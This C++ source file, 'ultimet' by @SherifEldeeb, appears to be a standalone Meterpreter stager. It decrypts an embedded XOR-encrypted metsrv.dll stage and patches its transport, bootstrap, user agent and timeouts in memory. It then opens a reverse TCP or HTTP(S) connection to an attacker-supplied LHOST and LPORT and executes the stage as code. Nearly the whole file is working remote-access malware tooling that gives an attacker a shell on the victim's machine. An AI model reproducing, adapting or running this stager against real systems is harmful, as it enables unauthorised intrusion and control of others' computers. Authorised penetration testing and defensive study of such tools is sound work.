//»”„ «··Â «·—Õ„‰ «·—ÕÌ„

/************************************************
 *					  [ultimet]					*
 *		The Ultimate Meterpreter Executable		*
 ************************************************		
  - @SherifEldeeb
  - http://eldeeb.net
  - Made in Egypt :)
 ************************************************/

#include "main.h"

int wmain(int argc, wchar_t *argv[])
{
	PAYLOAD_SETTINGS payload_settings = {0}; //That's defined at main.h
	BYTE* buffer = nullptr; // this will hold the stage 
	DWORD bufferSize = 0;	// buffer length
	DWORD index = 0;		// will be used to locate offset of stuff to be patched "reverse_tcp, reverse_http, the url ... etc."
	char EncKey[16] = {0};	// XOR Encryption key
	void (*function)();		// The casted-to-be-function after we have everything in place.
	
	/*
	Reverse_TCP specific Variables
	*/
	SOCKET ConnectSocket = INVALID_SOCKET; // Socket ... will be used for reverse_tcp
	
	/*
	HTTP(S) Specific Variables
	*/
	char url[512] = {0};	//Full URL 

	/*
	Program Start
	*/
	// Parse command line arguments, Fill the PAYLOAD_SETTINGS struct... idea from "http://www.cplusplus.com/forum/articles/13355/"
	for (int i = 1; i < argc; i++) 
	{
		if (i + 1 != argc) // Check that we haven't finished parsing already
			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are REVERSE_TCP, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
				payload_settings.TRANSPORT = argv[i + 1];
				_wcsupr(payload_settings.TRANSPORT); // Wide-String-to-uppercase
				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
				}
				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTP") == 0)
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTP";
				}
				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTPS") == 0)
				{
					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_HTTPS";
				}
				else {
					dprintf(L"[-] Unknown transport: \"%s\"\n[-] Valid transports are reverse_tcp, reverse_http and reverse_https.\n", payload_settings.TRANSPORT);
					exit(0);
				}
				// End of Transport checks
			} else if (wcscmp(argv[i], L"-lh") == 0) {//LHOST
				payload_settings.LHOST = argv[i + 1];
			} else if (wcscmp(argv[i], L"-lp") == 0) { //LPORT
				payload_settings.LPORT = argv[i + 1];
			} else if (wcscmp(argv[i], L"-sct") == 0) { //SessionCommunicationTimeout in seconds - 300 by default
				payload_settings.comm_timeout = _wtoi(argv[i + 1]);
			} else if (wcscmp(argv[i], L"-set") == 0) { //SessionExpirationTimeout in seconds - 604800 by default
				payload_settings.expiration_timeout = _wtoi(argv[i + 1]);
			}  else if (wcscmp(argv[i], L"-ua") == 0) { //USER_AGENT
				payload_settings.USER_AGENT = argv[i + 1];
			}
	}


	// Read resource into buffer ...
	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
	if (bufferSize == 0) // if something went wrong...
	{
		dprintf(L"[-] Couldn't read stage from resource, please make sure that the type is \"BINARY\" and the ID is \"101\".");
		exit(0);
	}
	GetKeyFromBuffer(buffer, EncKey, 16);
	XORcrypt(buffer, EncKey, bufferSize);
	buffer = buffer + 11; // 16 bytes encryption key - 5 bytes for (0xBF + Socket number)

	/*
	if(argc == 1)
	{
	bufferSize = ResourceToBuffer(IDR_BINARY1, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
	GetKeyFromBuffer(buffer, EncKey, 16);
	XORcrypt(buffer, EncKey, bufferSize);
	buffer = buffer + 11; // 16 bytes encryption key - 5 bytes for (0xBF + Socket number)
	}
	else
	{ 
	wchar_t filename[MAX_PATH] = {0};
	wcscpy_s(filename,argv[1]);
	bufferSize = CopyStageToBuffer(filename, &buffer);
	}
	*/

	/////////////////////////////////////////
	/****************************************
	*		Patching Stage in memory.		*
	****************************************/
	/////////////////////////////////////////

	// Patching transport 
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_transport, (int)strlen(global_meterpreter_transport));
	if (index == 0) // if the transport is not found ...
	{
		dprintf(L"[-] Couldn't locate transport string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
		exit(0);
	}
	dprintf(L"[*] Patching transport, Offset found at 0x%08x\n", index);
	PatchString(buffer, payload_settings.TRANSPORT, index, wcslen(payload_settings.TRANSPORT));

	// Patching ReflectiveDLL bootstrap 
	index = 0; //rewind.
	index = binstrstr(buffer, (int)bufferSize, (BYTE*)"MZ", (int)strlen("MZ"));
	if (index == 0) // if "MZ" not found ...
	{
		dprintf(L"[-] Couldn't locate \"MZ\", this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
		exit(0);
	}
	dprintf(L"[*] Patching ReflectiveDll Bootstrap, \"MZ\" Offset found at 0x%08x\n", index);	
	memcpy(buffer+index, ReflectiveDllBootLoader, 62);//dos header can't exceed 62

	//////////////////////////////////////////
	//  Stuff needed for HTTP/HTTPS only!!  //
	//////////////////////////////////////////
	if((wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0) || (wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTPS") == 0))
	{

		//Patching UserAgent
		index = 0; //rewind.
		index = binstrstr(buffer, (int)bufferSize, (BYTE*)global_meterpreter_ua, (int)strlen(global_meterpreter_ua));
		if (index == 0) // if the UA is not found ...
		{
			dprintf(L"[-] Couldn't locate UA string, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
			exit(0);
		}
		dprintf(L"[*] Patching UA, Offset found at 0x%08x\n", index);
		if(payload_settings.USER_AGENT == NULL)
		{
			dprintf(L"[+] No UserAgent specified, using default one ...\n");
			payload_settings.USER_AGENT = L"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko Firefox/11.0\x00";
		}
		PatchString(buffer, payload_settings.USER_AGENT, index, wcslen(payload_settings.USER_AGENT));

		//Patching global expiration timeout.
		index = 0; //rewind
		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x61\xe6\x4b\xb6", 4); //int *global_expiration_timeout = 0xb64be661; little endian, metsrv.dll 
		if (index == 0) // if the global_expiration_timeout is not found ...
		{
			dprintf(L"[-] Couldn't locate global_expiration_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
			exit(0);
		}
		dprintf(L"[*] Patching global_expiration_timeout, Offset found at 0x%08x\n", index);
		if(payload_settings.expiration_timeout == NULL)
		{
			dprintf(L"[+] No expiration_timeout specified, using 60400 seconds ...\n");
			payload_settings.expiration_timeout = 60400;
		}
		dprintf(L"[+] ... using \"%d\" seconds as specified...\n", payload_settings.expiration_timeout );
		memcpy(&buffer[index], &payload_settings.expiration_timeout, 4);

		//Patching global_comm_timeout.
		index = 0; //rewind
		index = binstrstr(buffer, (int)bufferSize, (BYTE*)"\x7f\x25\x79\xaf", 4); //int *global_comm_timeout = 0xaf79257f; little endian, metsrv.dll 
		if (index == 0) // if the global_expiration_timeout is not found ...
		{
			dprintf(L"[-] Couldn't locate global_comm_timeout, this means that the resource is not metsrv.dll, or something went wrong decrypting it.");
			exit(0);
		}
		dprintf(L"[*] Patching global_comm_timeout, Offset found at 0x%08x\n", index);
		if(payload_settings.comm_timeout == NULL)
		{
			dprintf(L"[+] No comm_timeout specified, using 300 seconds ...\n");
			payload_settings.comm_timeout = 300;
		}
		dprintf(L"[+] ... using \"%d\" seconds as specified...\n", payload_settings.comm_timeout );
		memcpy(&buffer[index], &payload_settings.comm_timeout, 4);
	}

	/*
	*	Preparing connection...
	*/
	// Are we reverse_tcp?
	if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
	{
		ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
		if (ConnectSocket == INVALID_SOCKET)
		{
			dprintf(L"[-] Failed to connect...\n");
			exit(0);
		}
		dprintf(L"[*] Setting EDI-to-be value to 0xBF at 0x%08x\n", &buffer);
		buffer[0] = 0xBF;
		dprintf(L"[*] Copying the socket address to the next 4 bytes...\n");
		memcpy(buffer+1, &ConnectSocket, 4);
		dprintf(L"[*] Everything in place, casting whole buffer as a function...\n");
	} 

	// Are we reverse_http(s)?
	else if((wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0) || (wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTPS") == 0))
	{
		/*
		Building the URL
		*/
		int checksum = 0;			//Calculated Checksum placeholder. 
		char URI_Part_1[4] = {0};	//4 chars ... it can be any length actually.
		char URI_Part_2[16] = {0};	//16 random chars.
		srand ( time(NULL) );	//Seed rand() 

		while(true)				//Keep getting random values till we succeed
		{
			gen_random(URI_Part_1, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounded just fine.
			checksum = TextChecksum8(URI_Part_1);	//Get the 8-bit checksum of the random value
			if(checksum == URI_CHECKSUM_CONN)		//If the checksum == 98, it will be handled by the multi/handler correctly as a "CONN_" request and short fused into a session.
			{
				break; // We found a random string that checksums to 98
			}
		}
		gen_random(URI_Part_2, 16);	//get second part, random 16 chars

		//Let's build the complete uri, it should look like http(s)://LHOST:LPORT/CHECKSUM8(98)_XXXXXXXXXXXXXXXX/
		//HTTP? HTTPS?
		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_HTTP") == 0)
			strcat_s(url, "http://");
		else
			strcat_s(url, "https://");

		//The joys of converting between wchar_t and char ...
		char tempChar1[512] = {0}; //This is used for converting from wchar_t to char... 
		char tempChar2[512] = {0}; //This is used for converting from wchar_t to char... 

		wcstombs_s(NULL,tempChar1,payload_settings.LHOST, wcslen(payload_settings.LHOST)); //convert the LHOST to char
		wcstombs_s(NULL,tempChar2,payload_settings.LPORT, wcslen(payload_settings.LHOST)); //convert the LPORT to char

		//wide-char conversion happiness ends here... building the url...
		strcat_s(url,tempChar1);	// "http(s)://LHOST"
		strcat_s(url,":");			// "http(s)://LHOST:"
		strcat_s(url,tempChar2);	// "http(s)://LHOST:LPORT"
		strcat_s(url,"/");			// "http(s)://LHOST:LPORT/"
		strcat_s(url,URI_Part_1);	// "http(s)://LHOST:LPORT/CONN"
		strcat_s(url,"_");			// "http(s)://LHOST:LPORT/CONN_"
		strcat_s(url,URI_Part_2);	// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX"
		strcat_s(url,"/\0");		// "http(s)://LHOST:LPORT/CONN_XXXXXXXXXXXX/"
		//Thanks for waiting :)
		wchar_t temp[512] = {0};
		mbstowcs_s(NULL,temp,url,strlen(url));
		dprintf(L"[*] URL: %s\n",temp);
	}

	function = (void (*)())buffer;
	dprintf(L"[*] Calling the function, bye bye inmet, hello metasploit!\n");
	function();
	//function();


	return 0;
}
